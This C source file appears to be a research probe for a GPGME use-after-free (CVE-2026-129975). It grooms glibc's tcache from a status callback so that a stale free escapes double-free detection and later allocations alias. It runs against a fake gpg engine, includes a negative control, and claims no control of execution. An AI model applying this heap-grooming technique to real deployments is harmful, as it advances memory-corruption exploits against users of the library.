/* Plain-glibc allocator-grooming probe for CVE-2026-129975.
 *
 * Public APIs only. In read_status(), the realloc at engine-gpg.c:1494 frees
 * the original 1024-byte status buffer into glibc's tcache BEFORE the monitor
 * callback runs at :1549. If the callback allocates a chunk of the same size
 * and keeps it, that entry is drained, so the stale-pointer free in
 * gpg_release :602 at the next operation's reset cannot be caught as a tcache
 * double free. A later malloc of that size may then alias the callback's
 * buffer. GROOM_ALLOC=0 is the within-driver negative control: no callback
 * allocation, so the plain allocator aborts as in run-plain.sh.
 *
 * This is harness-driven rung-4 mechanics. There is no attacker-controlled
 * groom, no pointer/IP/command control and no side effect; it is not rung 5.
 */
#include <gpgme.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int cb_calls;
static int groom_calls;
static char *groom_buf;

static gpgme_error_t
grooming_status_cb (void *opaque, const char *keyword, const char *args)
{
  (void)opaque;
  cb_calls++;
  fprintf (stderr,
           "status_cb call=%d op_marker=%s keyword=%s arglen=%zu byte[1000]=0x%02x\n",
           cb_calls, getenv ("FAKE_GPG_MARKER"), keyword, strlen (args),
           strlen (args) > 1000 ? (unsigned char) args[1000] : 0);
  if (strlen (args) > 500)
    {
      const char *skip = getenv ("GROOM_ALLOC");
      if (!skip || strcmp (skip, "0"))
        {
          groom_buf = malloc (1024);
          groom_calls++;
          if (groom_buf)
            memset (groom_buf, 0x47, 1024);
        }
      return gpg_error (GPG_ERR_GENERAL);
    }
  return 0;
}

static void
do_keylist (gpgme_ctx_t ctx, int op)
{
  gpgme_key_t key;
  gpgme_error_t err;

  err = gpgme_op_keylist_start (ctx, NULL, 0);
  fprintf (stderr, "op%d keylist_start err=%s\n", op, gpgme_strerror (err));
  while (!err)
    {
      err = gpgme_op_keylist_next (ctx, &key);
      if (!err)
        gpgme_key_release (key);
    }
  fprintf (stderr, "op%d keylist_end err=%s cb_calls=%d\n",
           op, gpgme_strerror (err), cb_calls);
}

int
main (int argc, char **argv)
{
  gpgme_ctx_t ctx = NULL;
  gpgme_error_t err;
  char *after;

  if (argc != 2)
    {
      fprintf (stderr, "usage: %s FAKE_GPG_PATH\n", argv[0]);
      return 2;
    }
  if (!gpgme_check_version (NULL))
    return 2;
  err = gpgme_set_engine_info (GPGME_PROTOCOL_OpenPGP, argv[1], NULL);
  if (err)
    return 2;
  err = gpgme_new (&ctx);
  if (err)
    return 2;
  gpgme_set_ctx_flag (ctx, "full-status", "1");
  gpgme_set_status_cb (ctx, grooming_status_cb, NULL);

  setenv ("FAKE_GPG_LEN", "1200", 1);
  setenv ("FAKE_GPG_MARKER", "H", 1);
  do_keylist (ctx, 1);

  setenv ("FAKE_GPG_LEN", "20", 1);
  setenv ("FAKE_GPG_MARKER", "Z", 1);
  do_keylist (ctx, 2);

  gpgme_release (ctx);
  puts ("release done");
  after = malloc (1024);
  if (after)
    memset (after, 0x41, 1024);
  fprintf (stderr, "groom_calls=%d groom_buf=%p after=%p aliased=%d\n",
           groom_calls, (void *) groom_buf, (void *) after,
           (groom_buf && after && groom_buf == after));
  if (groom_buf && after)
    fprintf (stderr, "groom_buf byte[1000]=0x%02x after byte[1000]=0x%02x\n",
             (unsigned char) groom_buf[1000], (unsigned char) after[1000]);
  return 0;
}
